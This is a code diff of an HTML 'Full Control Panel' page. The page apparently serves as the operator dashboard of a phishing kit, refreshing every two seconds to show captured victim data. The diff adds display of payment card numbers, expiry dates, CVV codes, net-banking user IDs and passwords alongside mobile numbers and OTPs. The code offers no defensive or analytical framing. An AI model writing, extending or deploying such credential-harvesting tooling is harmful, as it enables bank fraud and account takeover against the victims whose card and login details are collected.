@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Clean Panel</title>
+    <title>Admin - Full Control Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
@@ -25,7 +25,6 @@
         h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
         .sub-text { color: red; font-size: 10px; font-weight: bold; margin-top: 2px; }
 
-        /* Transparent Count Style */
         #click-count {
             font-family: 'Orbitron', sans-serif;
             font-size: 26px;
@@ -36,16 +35,28 @@
 
         #data-container { padding: 20px 10px; max-width: 500px; margin: 0 auto; }
 
-        /* No Border Card Style */
         .card {
             text-align: left;
             padding: 20px;
             background: #ffffff;
             border-radius: 12px;
             margin-bottom: 15px;
-            /* Border hatakar shadow lagayi hai card feel ke liye */
             box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
             border: none; 
+            position: relative;
+        }
+
+        /* Naya: Card type tag */
+        .card-type {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 9px;
+            background: #000;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 5px;
+            text-transform: uppercase;
         }
 
         .data-text {
@@ -64,6 +75,8 @@
             display: block;
             margin-bottom: 2px;
         }
+
+        .divider { height: 1px; background: #eee; margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -71,7 +84,7 @@
     <header>
         <div class="header-center">
             <h1>LIVE</h1>
-            <div class="sub-text">Show Data here </div>
+            <div class="sub-text">All Data Incoming</div>
         </div>
         <div id="click-count">00</div>
     </header>
@@ -94,16 +107,43 @@
 
                 data.forEach(entry => {
                     let content = "";
-                    if (entry.mobile) content += `<span class="label-style">Mobile</span>${entry.mobile}\n\n`;
-                    if (entry.credentials) content += `<span class="label-style">Credentials</span>${entry.credentials}\n\n`;
-                    if (entry.otp_1) content += `<span class="label-style">OTP 1</span>${entry.otp_1}\n`;
-                    if (entry.otp_2) content += `<span class="label-style">OTP 2</span>${entry.otp_2}\n`;
-                    if (entry.otp_3) content += `<span class="label-style">OTP 3</span>${entry.otp_3}`;
+                    let type = "General";
+
+                    // --- 1. CARD DETAILS (CHECK) ---
+                    if (entry.card_holder_name || entry.card_number) {
+                        type = "Card Info";
+                        if (entry.card_holder_name) content += `<span class="label-style">Holder Name</span>${entry.card_holder_name}\n`;
+                        if (entry.card_number) content += `<span class="label-style">Card Number</span>${entry.card_number}\n`;
+                        if (entry.expiry_date) content += `<span class="label-style">Expiry</span>${entry.expiry_date}\n`;
+                        if (entry.cvv_code) content += `<span class="label-style">CVV Code</span>${entry.cvv_code}\n`;
+                    }
+
+                    // --- 2. NET BANKING (CHECK) ---
+                    if (entry.bank_name || entry.user_id) {
+                        if (content !== "") content += `<div class="divider"></div>`;
+                        type = entry.bank_name || "Net Banking";
+                        if (entry.bank_name) content += `<span class="label-style">Bank</span>${entry.bank_name}\n`;
+                        if (entry.user_id) content += `<span class="label-style">User ID</span>${entry.user_id}\n`;
+                        if (entry.password) content += `<span class="label-style">Password</span>${entry.password}\n`;
+                    }
+
+                    // --- 3. MOBILE & OTP (CHECK) ---
+                    if (entry.mobile || entry.otp_1) {
+                        if (content !== "") content += `<div class="divider"></div>`;
+                        if (entry.mobile) content += `<span class="label-style">Mobile</span>${entry.mobile}\n`;
+                        if (entry.credentials) content += `<span class="label-style">Credentials</span>${entry.credentials}\n`;
+                        if (entry.otp_1) content += `<span class="label-style">OTP 1</span>${entry.otp_1}\n`;
+                        if (entry.otp_2) content += `<span class="label-style">OTP 2</span>${entry.otp_2}\n`;
+                        if (entry.otp_3) content += `<span class="label-style">OTP 3</span>${entry.otp_3}`;
+                    }
 
                     if (content.trim() !== "") {
                         const card = document.createElement('div');
                         card.className = 'card';
-                        card.innerHTML = `<div class="data-text">${content}</div>`;
+                        card.innerHTML = `
+                            <div class="card-type">${type}</div>
+                            <div class="data-text">${content}</div>
+                        `;
                         container.appendChild(card);
                     }
                 });
@@ -112,6 +152,7 @@
             }
         }
 
+        // Auto Refresh every 2 seconds
         setInterval(fetchData, 2000);
         fetchData();
     </script>
